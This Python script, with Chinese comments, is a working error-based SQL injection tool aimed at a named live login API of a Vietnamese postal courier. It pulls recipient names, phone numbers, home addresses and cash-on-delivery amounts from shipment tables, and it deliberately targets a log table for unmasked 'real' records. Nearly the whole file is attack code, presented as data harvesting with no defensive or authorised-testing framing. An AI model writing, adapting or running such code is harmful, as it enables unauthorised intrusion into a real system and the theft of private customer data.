#!/usr/bin/env python3
"""
获取实际的地址样本数据
"""

import requests
import json
import time

class AddressSampler:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def get_shipment_address_samples(self):
        """获取SHIPMENT表的地址样本"""
        print("=" * 80)
        print("📍 SHIPMENT表地址样本（10条实际地址）")
        print("=" * 80)
        
        date = '20251010'
        
        for i in range(1, 11):
            print(f"\n{'='*80}")
            print(f"样本 {i}")
            print(f"{'='*80}")
            
            # 获取CODE
            query_code = f"SELECT CODE FROM (SELECT CODE, ROWNUM AS RN FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}') WHERE RN={i}"
            code = self.extract_via_error(query_code)
            
            if code:
                print(f"运单号: {code}")
                
                # 收件人姓名
                query_name = f"SELECT RECEIVER_NAME FROM EMS.SHIPMENT WHERE CODE='{code}' AND ROWNUM=1"
                name = self.extract_via_error(query_name)
                if name:
                    print(f"收件人: {name}")
                
                # 收件人电话
                query_phone = f"SELECT RECEIVER_PHONE FROM EMS.SHIPMENT WHERE CODE='{code}' AND ROWNUM=1"
                phone = self.extract_via_error(query_phone)
                if phone:
                    print(f"收件电话: {phone}")
                
                # 收件人地址
                query_addr = f"SELECT RECEIVER_ADDRESS FROM EMS.SHIPMENT WHERE CODE='{code}' AND ROWNUM=1"
                addr = self.extract_via_error(query_addr)
                if addr and addr != 'NULL':
                    print(f"收件地址: {addr}")
                
                # 省份
                query_province = f"SELECT RECEIVER_PROVINCE_ID FROM EMS.SHIPMENT WHERE CODE='{code}' AND ROWNUM=1"
                province = self.extract_via_error(query_province)
                if province:
                    print(f"省份ID: {province}")
                
                # 区县
                query_district = f"SELECT RECEIVER_DISTRICT_ID FROM EMS.SHIPMENT WHERE CODE='{code}' AND ROWNUM=1"
                district = self.extract_via_error(query_district)
                if district:
                    print(f"区县ID: {district}")
                
                # 代收金额
                query_cod = f"SELECT COD FROM EMS.SHIPMENT WHERE CODE='{code}' AND ROWNUM=1"
                cod = self.extract_via_error(query_cod)
                if cod:
                    print(f"代收金额: {cod} VND")
                
                time.sleep(3)
    
    def get_e1e2_address_samples(self):
        """获取E1E2_PH表的地址样本"""
        print("\n" + "=" * 80)
        print("📍 E1E2_PH表地址样本（10条实际地址）")
        print("=" * 80)
        
        date = '20251010'
        
        for i in range(1, 11):
            print(f"\n{'='*80}")
            print(f"样本 {i}")
            print(f"{'='*80}")
            
            # 获取有地址的MABC
            query_mabc = f"SELECT MABC FROM (SELECT DISTINCT MABC, ROWNUM AS RN FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIACHI IS NOT NULL) WHERE RN={i}"
            mabc = self.extract_via_error(query_mabc)
            
            if mabc:
                print(f"MABC: {mabc}")
                
                # 收件人
                query_name = f"SELECT NGUOINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
                name = self.extract_via_error(query_name)
                if name:
                    print(f"收件人: {name}")
                
                # 电话
                query_phone = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
                phone = self.extract_via_error(query_phone)
                if phone:
                    print(f"收件电话: {phone}")
                
                # 地址
                query_addr = f"SELECT DIACHI FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
                addr = self.extract_via_error(query_addr)
                if addr and addr != 'NULL':
                    print(f"收件地址: {addr}")
                
                # 发件人电话
                query_sender = f"SELECT DIENTHOAIGUI FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
                sender = self.extract_via_error(query_sender)
                if sender and sender != 'NULL' and sender != '0':
                    print(f"发件电话: {sender}")
                
                # 代收
                query_cod = f"SELECT SO_TIEN_THU_HO FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
                cod = self.extract_via_error(query_cod)
                if cod and cod != '0':
                    print(f"代收金额: {cod} VND")
                
                time.sleep(3)
    
    def get_real_address_from_temp_log(self):
        """从TEMP_DATA2_LOG获取真实地址（未脱敏）"""
        print("\n" + "=" * 80)
        print("🔓 从TEMP_DATA2_LOG表获取真实地址（未脱敏）")
        print("=" * 80)
        
        # 测试几个MABC
        test_mabcs = ['701000', '236160', '700916', '725231', '100916']
        
        for mabc in test_mabcs:
            print(f"\n{'='*80}")
            print(f"MABC: {mabc}")
            print(f"{'='*80}")
            
            # 姓名
            query_name = f"SELECT NGUOINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND ROWNUM=1"
            name = self.extract_via_error(query_name)
            if name:
                print(f"真实姓名: {name}")
            
            # 电话
            query_phone = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND DIENTHOAINHAN!='0999999999' AND ROWNUM=1"
            phone = self.extract_via_error(query_phone)
            if phone and phone != '0999999999':
                print(f"真实电话: {phone}")
            
            # 地址
            query_addr = f"SELECT DIACHI FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND ROWNUM=1"
            addr = self.extract_via_error(query_addr)
            if addr and addr != 'NULL':
                print(f"真实地址: {addr}")
            
            time.sleep(3)
    
    def run_sampling(self):
        """执行采样"""
        print("=" * 80)
        print("📍 地址数据样本查询")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 获取样本
        self.get_shipment_address_samples()
        self.get_e1e2_address_samples()
        self.get_real_address_from_temp_log()
        
        print("\n" + "=" * 80)
        print("📊 地址数据总结")
        print("=" * 80)
        
        print("\n✅ SHIPMENT表:")
        print("   • 100%有地址")
        print("   • 地址完整（但查询时可能被截断）")
        print("   • 包含省份、区县ID")
        
        print("\n✅ E1E2_PH表:")
        print("   • 99%有地址")
        print("   • 地址已脱敏（+++开头）")
        print("   • 可通过MABC查询真实地址")
        
        print("\n✅ TEMP_DATA2_LOG表:")
        print("   • 包含真实地址（未脱敏）")
        print("   • 可通过MABC直接获取")
        
        print("\n" + "=" * 80)
        print("🎉 采样完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    sampler = AddressSampler(target_url)
    sampler.run_sampling()
